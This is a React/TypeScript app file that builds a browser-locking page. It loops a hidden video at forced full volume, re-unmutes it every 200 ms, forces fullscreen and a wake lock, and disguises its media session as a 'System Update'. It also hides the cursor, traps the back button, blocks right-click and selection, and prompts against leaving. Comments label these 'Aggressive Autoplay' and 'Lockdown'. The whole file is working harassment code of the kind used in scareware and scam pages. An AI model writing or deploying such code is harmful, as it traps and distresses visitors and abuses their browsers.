/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useEffect, useRef, useState } from 'react';

export default function App() {
  const mediaRef = useRef<HTMLVideoElement | null>(null);
  const [hasInteracted, setHasInteracted] = useState(false);
  const wakeLockRef = useRef<any>(null);
  const audioCtxRef = useRef<AudioContext | null>(null);

  // Initialize Media Session and Wake Lock
  useEffect(() => {
    if (!hasInteracted) return;

    const requestWakeLock = async () => {
      if (!('wakeLock' in navigator)) return;
      try {
        wakeLockRef.current = await (navigator as any).wakeLock.request('screen');
      } catch (err) {}
    };

    const handleVisibilityChange = async () => {
      if (wakeLockRef.current !== null && document.visibilityState === 'visible') {
        await requestWakeLock();
      }
    };

    requestWakeLock();
    document.addEventListener('visibilitychange', handleVisibilityChange);

    if ('mediaSession' in navigator) {
      navigator.mediaSession.metadata = new MediaMetadata({
        title: 'System Update',
        artist: 'Absolute Zero',
        album: 'Void',
        artwork: [
          { src: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', sizes: '1x1', type: 'image/png' }
        ]
      });

      const noop = () => mediaRef.current?.play().catch(() => {});
      ['play', 'pause', 'stop', 'seekbackward', 'seekforward', 'previoustrack', 'nexttrack'].forEach(action => {
        try { navigator.mediaSession.setActionHandler(action as MediaSessionAction, noop); } catch (e) {}
      });
    }

    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      if (wakeLockRef.current) wakeLockRef.current.release().catch(() => {});
    };
  }, [hasInteracted]);

  // Aggressive Autoplay & Audio Context Unlock
  useEffect(() => {
    const media = mediaRef.current;
    if (!media) return;

    const unlockAudio = async () => {
      if (hasInteracted) return;
      
      // Prime AudioContext - Must be created/resumed within a user gesture
      try {
        if (!audioCtxRef.current) {
          audioCtxRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
        }
        if (audioCtxRef.current.state === 'suspended') {
          await audioCtxRef.current.resume();
        }
        
        // Create a tiny silent buffer to fully "warm up" the hardware
        const oscillator = audioCtxRef.current.createOscillator();
        const gainNode = audioCtxRef.current.createGain();
        gainNode.gain.value = 0.0001; // Nearly silent but non-zero
        oscillator.connect(gainNode);
        gainNode.connect(audioCtxRef.current.destination);
        oscillator.start(0);
        oscillator.stop(0.1);
      } catch (e) {
        console.warn("AudioContext priming failed:", e);
      }

      setHasInteracted(true);
      
      if (media) {
        media.muted = false;
        media.volume = 1.0;
        // Force a play call. Browsers require this to be inside the event handler.
        const playPromise = media.play();
        if (playPromise !== undefined) {
          playPromise.catch((err) => {
            console.warn("Play failed after interaction:", err);
            // Fallback: try playing again on next frame
            requestAnimationFrame(() => media.play().catch(() => {}));
          });
        }
      }

      try {
        document.documentElement.requestFullscreen().catch(() => {});
      } catch (e) {}
    };

    // Listen for ANY interaction (hair-trigger)
    // Including 'click' and 'scroll' for maximum coverage on all devices
    const events = ['touchstart', 'mousedown', 'keydown', 'wheel', 'mousemove', 'pointerdown', 'scroll', 'click'];
    events.forEach(e => document.addEventListener(e, unlockAudio, { once: true }));

    // Start video MUTED immediately (allowed by all browsers)
    // This ensures the video is already "running" when the user interacts
    media.muted = true;
    media.play().catch(() => {
      const retry = setInterval(() => {
        if (media.paused) {
          media.play().then(() => clearInterval(retry)).catch(() => {});
        } else {
          clearInterval(retry);
        }
      }, 100);
    });

    // Enforcement Loop: Ensure it stays playing and stays unmuted after interaction
    const interval = setInterval(() => {
      if (media.paused) media.play().catch(() => {});
      if (hasInteracted) {
        if (media.muted) media.muted = false;
        if (media.volume < 1.0) media.volume = 1.0;
      }
    }, 200);

    return () => {
      events.forEach(e => document.removeEventListener(e, unlockAudio));
      clearInterval(interval);
    };
  }, [hasInteracted]);

  // Navigation & Lockdown
  useEffect(() => {
    const preventBack = () => window.history.pushState(null, '', window.location.href);
    window.history.pushState(null, '', window.location.href);
    window.addEventListener('popstate', preventBack);

    const preventDefault = (e: Event) => e.preventDefault();
    document.addEventListener('contextmenu', preventDefault);
    document.addEventListener('selectstart', preventDefault);
    
    const preventUnload = (e: BeforeUnloadEvent) => {
      e.preventDefault();
      e.returnValue = '';
      return '';
    };
    window.addEventListener('beforeunload', preventUnload);
    
    return () => {
      window.removeEventListener('popstate', preventBack);
      document.removeEventListener('contextmenu', preventDefault);
      document.removeEventListener('selectstart', preventDefault);
      window.removeEventListener('beforeunload', preventUnload);
    };
  }, []);

  return (
    <div 
      className="fixed inset-0 bg-black cursor-none select-none touch-none overflow-hidden flex flex-col items-center justify-center"
      style={{ userSelect: 'none', touchAction: 'none' }}
    >
      <video
        ref={mediaRef}
        src="video.mp4"
        loop
        preload="auto"
        playsInline
        autoPlay
        muted
        className="absolute w-px h-px opacity-0 pointer-events-none"
        onError={(e) => console.error("Video load error:", e)}
      />
    </div>
  );
}



